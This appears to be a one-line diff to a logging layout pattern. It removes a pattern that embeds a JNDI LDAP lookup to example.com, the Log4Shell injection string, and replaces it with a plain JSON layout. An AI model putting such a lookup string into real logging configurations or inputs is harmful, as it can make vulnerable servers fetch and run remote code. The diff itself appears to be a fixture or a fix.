@@ -1,1 +1,1 @@
-%d{yyyy-MM-dd HH:mm:ss,SSS} [%t] %-5p %c{1}:%L - ${jndi:ldap://example.com}
+{"message": "%m", "level": "%p", "nested": {"field1": "%d", "field2": "%t"}}
